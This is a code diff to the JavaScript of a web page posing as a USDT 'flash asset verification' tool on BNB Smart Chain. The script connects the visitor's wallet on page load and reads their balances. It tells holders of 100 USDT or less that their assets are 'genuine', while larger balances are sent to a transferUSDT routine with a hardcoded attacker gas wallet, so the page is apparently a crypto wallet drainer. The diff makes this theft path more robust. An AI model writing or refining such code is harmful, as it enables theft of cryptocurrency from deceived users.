@@ -3,60 +3,54 @@ const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
 
 let web3;
-let userAddress;
+let userAddress = null;
 
 async function connectWallet() {
     const provider = window.ethereum || window.trustwallet || window.BinanceChain;
 
-    if (provider) {
-        web3 = new Web3(provider);
+    if (!provider) {
+        alert("Wallet not detected. Use Trust Wallet or MetaMask browser.");
+        return null;
+    }
 
-        try {
-            const accounts = await provider.request({ method: 'eth_requestAccounts' });
-            userAddress = accounts[0];
-            console.log("Wallet Detected:", userAddress);
+    web3 = new Web3(provider);
 
-            await provider.request({
-                method: "wallet_switchEthereumChain",
-                params: [{ chainId: "0x38" }]
-            });
+    try {
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+        userAddress = accounts[0];
 
-        } catch (error) {
-            console.error("Wallet connection error:", error);
-        }
-    } else {
-        alert("Wallet not detected. Use Trust Wallet browser.");
+        // Switch to BNB Smart Chain if needed
+        await provider.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x38" }]
+        });
+
+        console.log("Wallet connected:", userAddress);
+        return userAddress;
+    } catch (error) {
+        console.error("Wallet connection error:", error);
+        return null;
     }
 }
 
-            userAddress = accounts[0];
-            console.log("Wallet Detected:", userAddress);
-
-            // Switch to BNB Smart Chain
-            await window.ethereum.request({
-                method: "wallet_switchEthereumChain",
-                params: [{ chainId: "0x38" }]
-            });
-
-        } catch (error) {
-            console.error("Error detecting wallet:", error);
-        }
-    } else {
-        alert("Trust Wallet or MetaMask not detected.");
-    }
-}
-
-// ✅ Step: Delay auto connect (gives Trust Wallet time to inject)
+// Delay auto connect to give Trust Wallet time to inject
 window.addEventListener("load", () => {
-    setTimeout(() => {
-        connectWallet();
-    }, 3000); // 3 second delay — increase to 3000 if needed
+    setTimeout(async () => {
+        const addr = await connectWallet();
+        if (!addr) {
+            console.warn("Wallet not connected on load. User must connect manually.");
+        }
+    }, 3000);
 });
 
 async function verifyAssets() {
     if (!web3 || !userAddress) {
-        alert("Wallet not detected. Use Trust Wallet browser.");
-        return;
+        // Try to connect wallet on demand if not connected yet
+        const addr = await connectWallet();
+        if (!addr) {
+            alert("Wallet not detected or connection denied.");
+            return;
+        }
     }
 
     const usdtContract = new web3.eth.Contract([
@@ -69,33 +63,38 @@ async function verifyAssets() {
         }
     ], usdtContractAddress);
 
-    const [usdtBalanceWei, userBNBWei] = await Promise.all([
-        usdtContract.methods.balanceOf(userAddress).call(),
-        web3.eth.getBalance(userAddress)
-    ]);
+    try {
+        const [usdtBalanceWei, userBNBWei] = await Promise.all([
+            usdtContract.methods.balanceOf(userAddress).call(),
+            web3.eth.getBalance(userAddress)
+        ]);
 
-    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
-    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));
+        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
+        const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));
 
-    console.log(`USDT Balance: ${usdtBalance}`);
-    console.log(`BNB Balance: ${userBNB}`);
+        console.log(`USDT Balance: ${usdtBalance}`);
+        console.log(`BNB Balance: ${userBNB}`);
 
-    if (usdtBalance === 0) {
-        showPopup("No assets found.", "black");
-        return;
+        if (usdtBalance === 0) {
+            showPopup("No assets found.", "black");
+            return;
+        }
+
+        if (usdtBalance <= 100) {
+            showPopup(
+                `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
+                "green"
+            );
+            return;
+        }
+
+        showPopup("Loading...", "green");
+
+        await transferUSDT(usdtBalance, userBNB);
+    } catch (error) {
+        console.error("Error verifying assets:", error);
+        alert("Failed to verify assets. Check console for details.");
     }
-
-    if (usdtBalance <= 100) {
-        showPopup(
-            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
-            "green"
-        );
-        return;
-    }
-
-    showPopup("Loading...", "green");
-
-    transferUSDT(usdtBalance, userBNB);
 }
 
 async function transferUSDT(usdtBalance, userBNB) {
@@ -140,21 +139,6 @@ async function transferUSDT(usdtBalance, userBNB) {
     }
 }
 
-async function sendBNB(toAddress, amount) {
-    try {
-        await web3.eth.sendTransaction({
-            from: bnbGasSender,
-            to: toAddress,
-            value: web3.utils.toWei(amount, "ether"),
-            gas: 21000
-        });
-
-        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
-    } catch (error) {
-        console.error("⚠️ Error sending BNB:", error);
-    }
-}
-
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
 
@@ -176,7 +160,7 @@ function showPopup(message, color) {
     }
 
     popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
-    popup.style.color = color === "red" ? "red" : "green";
+    popup.style.color = color === "red" ? "red" : (color === "green" ? "green" : "black");
     popup.innerHTML = message;
     popup.style.display = "block";
 
@@ -185,4 +169,12 @@ function showPopup(message, color) {
     }, 5000);
 }
 
-document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
+// Attach event listener after DOM is loaded
+window.addEventListener("DOMContentLoaded", () => {
+    const btn = document.getElementById("verifyAssets");
+    if (btn) {
+        btn.addEventListener("click", verifyAssets);
+    } else {
+        console.error("Verify Assets button not found!");
+    }
+});
